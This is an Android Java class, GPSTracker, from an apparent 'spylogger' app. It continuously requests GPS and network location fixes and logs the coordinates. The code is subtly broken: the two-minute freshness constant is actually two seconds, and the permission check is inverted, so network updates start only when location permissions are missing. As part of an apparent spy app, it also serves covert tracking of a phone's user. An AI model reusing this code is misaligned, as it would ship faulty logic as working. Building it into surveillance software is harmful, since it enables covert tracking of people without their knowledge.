package com.gravatasufoca.spylogger.services;

import android.Manifest;
import android.content.Context;
import android.content.pm.PackageManager;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.os.Bundle;
import android.support.v4.app.ActivityCompat;
import android.util.Log;

public class GPSTracker implements LocationListener {
    private Location currentBestLocation = null;
    static final int TWO_MINUTES = 1000 * 2;

    private Context mContext;
    protected LocationManager locationManager;
    private boolean isGPSEnabled, isNetworkEnabled;


    public GPSTracker(Context context) {
        this.mContext = context;
        getLocation();
    }

    private void getLocation() {
        try {
            locationManager = (LocationManager) mContext.getSystemService(Context.LOCATION_SERVICE);

            // Getting GPS status
            isGPSEnabled = locationManager
                    .isProviderEnabled(LocationManager.GPS_PROVIDER);

            // Getting network status
            isNetworkEnabled = locationManager
                    .isProviderEnabled(LocationManager.NETWORK_PROVIDER);

            if (!isGPSEnabled && !isNetworkEnabled) {
                // No network provider is enabled
            } else {
                if (isNetworkEnabled) {
                    if (ActivityCompat.checkSelfPermission(mContext, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED && ActivityCompat.checkSelfPermission(mContext, Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED) {

                        locationManager.requestLocationUpdates(
                                LocationManager.NETWORK_PROVIDER,
                                0, 0, this);
                        if (locationManager != null) {
                            currentBestLocation = locationManager
                                    .getLastKnownLocation(LocationManager.NETWORK_PROVIDER);

                        }
                    }
                }
                // If GPS enabled, get latitude/longitude using GPS Services
                if (isGPSEnabled) {
                    if (currentBestLocation == null) {
                        locationManager.requestLocationUpdates(
                                LocationManager.GPS_PROVIDER,
                                0, 0, this);
                        if (locationManager != null) {
                            currentBestLocation = locationManager
                                    .getLastKnownLocation(LocationManager.GPS_PROVIDER);
                        }
                    }
                }
            }
        }
        catch (Exception e) {
            e.printStackTrace();
        }

    }

    public void endTracking(){
        if(locationManager!=null){
            locationManager.removeUpdates(this);
        }
    }

    public boolean canGetLocation(){
        return isGPSEnabled || isNetworkEnabled;
    }

    @Override
    public void onStatusChanged(String s, int i, Bundle bundle) {

    }

    @Override
    public void onProviderEnabled(String s) {

    }

    @Override
    public void onProviderDisabled(String s) {
        endTracking();
    }

    @Override
    public void onLocationChanged(Location location) {

        makeUseOfNewLocation(location);

        Log.i("GPS LOCATION", Double.toString(getLatitude()) + "," + Double.toString(getLongitude()));
        Log.i("GPS LOCATION", Double.toString(getAccuracy()));

        if(currentBestLocation == null){
            currentBestLocation = location;
        }

    }


    public double getLongitude(){
        if(currentBestLocation!=null){
            return currentBestLocation.getLongitude();
        }
        return 0;
    }

    public double getLatitude(){
        if(currentBestLocation!=null){
            return currentBestLocation.getLatitude();
        }
        return 0;
    }

    public float getAccuracy(){
        if(currentBestLocation!=null){
            return currentBestLocation.getAccuracy();
        }
        return 0;
    }


    /**
     * This method modify the last know good location according to the arguments.
     *
     * @param location The possible new location.
     */
    void makeUseOfNewLocation(Location location) {
        if ( isBetterLocation(location, currentBestLocation) ) {
            currentBestLocation = location;
            Log.i("POSITION: ",Double.toString(currentBestLocation.getLatitude())+","+Double.toString(currentBestLocation.getLongitude()));
        }
    }


    /** Determines whether one location reading is better than the current location fix
     * @param location  The new location that you want to evaluate
     * @param currentBestLocation  The current location fix, to which you want to compare the new one.
     */
    protected boolean isBetterLocation(Location location, Location currentBestLocation) {
        if (currentBestLocation == null) {
            // A new location is always better than no location
            return true;
        }

        // Check whether the new location fix is newer or older
        long timeDelta = location.getTime() - currentBestLocation.getTime();
        boolean isSignificantlyNewer = timeDelta > TWO_MINUTES;
        boolean isSignificantlyOlder = timeDelta < -TWO_MINUTES;
        boolean isNewer = timeDelta > 0;

        // If it's been more than two minutes since the current location, use the new location,
        // because the user has likely moved.
        if (isSignificantlyNewer) {
            return true;
            // If the new location is more than two minutes older, it must be worse.
        } else if (isSignificantlyOlder) {
            return false;
        }

        // Check whether the new location fix is more or less accurate
        int accuracyDelta = (int) (location.getAccuracy() - currentBestLocation.getAccuracy());
        boolean isLessAccurate = accuracyDelta > 0;
        boolean isMoreAccurate = accuracyDelta < 0;
        boolean isSignificantlyLessAccurate = accuracyDelta > 200;

        // Check if the old and new location are from the same provider
        boolean isFromSameProvider = isSameProvider(location.getProvider(),
                currentBestLocation.getProvider());

        // Determine location quality using a combination of timeliness and accuracy
        if (isMoreAccurate) {
            return true;
        } else if (isNewer && !isLessAccurate) {
            return true;
        } else if (isNewer && !isSignificantlyLessAccurate && isFromSameProvider) {
            return true;
        }
        return false;
    }

    /** Checks whether two providers are the same */
    private boolean isSameProvider(String provider1, String provider2) {
        if (provider1 == null) {
            return provider2 == null;
        }
        return provider1.equals(provider2);
    }
}